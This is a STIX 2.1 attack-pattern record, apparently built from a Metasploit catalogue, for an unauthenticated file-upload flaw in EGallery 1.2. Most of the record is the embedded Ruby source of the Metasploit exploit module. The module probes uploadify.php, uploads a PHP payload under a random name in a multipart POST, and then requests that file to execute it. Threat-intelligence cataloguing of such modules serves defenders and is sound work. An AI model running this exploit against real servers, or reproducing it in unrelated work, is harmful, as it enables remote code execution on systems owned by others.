{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--91332d70-a448-4d37-83e1-39dbdc17e81d",
    "created": "2024-08-14T17:13:05.016925Z",
    "modified": "2024-08-14T17:13:05.016929Z",
    "name": "\"EGallery PHP File Upload Vulnerability\"",
    "description": " This module exploits a vulnerability found in EGallery 1.2 By abusing the uploadify.php file, a malicious user can upload a file to the egallery/ directory without any authentication, which results in arbitrary code execution. The module has been tested successfully on Ubuntu 10.04.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/egallery_upload_exec.rb",
            "external_id": "egallery_upload_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.opensyscom.fr/Actualites/egallery-arbitrary-file-upload-vulnerability.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"EGallery PHP File Upload Vulnerability\",\n      'Description'    => %q{\n          This module exploits a vulnerability found in EGallery 1.2 By abusing the\n        uploadify.php file, a malicious user can upload a file to the egallery/ directory\n        without any authentication, which results in arbitrary code execution. The module\n        has been tested successfully on Ubuntu 10.04.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Sammy FORGIT', # Discovery, PoC\n          'juan vazquez' # Metasploit module\n        ],\n      'References'     =>\n        [\n          ['OSVDB', '83891'],\n          ['BID', '54464'],\n          ['URL', 'http://www.opensyscom.fr/Actualites/egallery-arbitrary-file-upload-vulnerability.html']\n        ],\n      'Payload'        =>\n        {\n          'BadChars' => \"\\x00\"\n        },\n      'DefaultOptions'  =>\n        {\n          'EXITFUNC' => 'thread'\n        },\n      'Platform'       => ['php'],\n      'Arch'           => ARCH_PHP,\n      'Targets'        =>\n        [\n          ['EGallery 1.2', {}]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2012-07-08',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          OptString.new('TARGETURI', [true, 'The base path to EGallery', '/sample'])\n        ])\n  end\n\n  def check\n    uri = target_uri.path\n\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => normalize_uri(uri, \"egallery\", \"uploadify.php\")\n    })\n\n    if res and res.code == 200 and res.body.empty?\n      return Exploit::CheckCode::Appears\n    else\n      return Exploit::CheckCode::Safe\n    end\n  end\n\n  def exploit\n    uri = normalize_uri(target_uri.path)\n    uri << '/' if uri[-1,1] != '/'\n\n    peer = \"#{rhost}:#{rport}\"\n    payload_name = rand_text_alpha(rand(10) + 5) + '.php'\n    boundary = Rex::Text.rand_text_hex(7)\n\n    post_data = \"--#{boundary}\\r\\n\"\n    post_data << \"Content-Disposition: form-data; name=\\\"Filename\\\"\\r\\n\\r\\n\"\n    post_data << \"#{payload_name}\\r\\n\"\n    post_data << \"--#{boundary}\\r\\n\"\n    post_data << \"Content-Disposition: form-data; name=\\\"folder\\\"\\r\\n\\r\\n\"\n    post_data << \"#{uri}\\r\\n\"\n    post_data << \"--#{boundary}\\r\\n\"\n    post_data << \"Content-Disposition: form-data; name=\\\"Filedata\\\"; filename=\\\"#{payload_name}\\\"\\r\\n\\r\\n\"\n    post_data << \"<?php \"\n    post_data << payload.encoded\n    post_data << \" ?>\\r\\n\"\n    post_data << \"--#{boundary}--\\r\\n\"\n\n    print_status(\"Sending PHP payload (#{payload_name})\")\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri'    => normalize_uri(\"#{uri}egallery/uploadify.php\"),\n      'ctype'  => \"multipart/form-data; boundary=#{boundary}\",\n      'data'   => post_data\n    })\n\n    # If the server returns 200 and the body contains our payload name,\n    # we assume we uploaded the malicious file successfully\n    if not res or res.code != 200 or res.body !~ /#{payload_name}/\n      print_error(\"File wasn't uploaded, aborting!\")\n      return\n    end\n\n    print_status(\"Executing PHP payload (#{payload_name})\")\n    # Execute our payload\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => normalize_uri(\"#{uri}#{payload_name}\")\n    })\n\n    # If we don't get a 200 when we request our malicious payload, we suspect\n    # we don't have a shell, either.  Print the status code for debugging purposes.\n    if res and res.code != 200\n      print_status(\"Server returned #{res.code.to_s}\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-07-08",
    "x_mitre_platforms": [
        "['php']"
    ]
}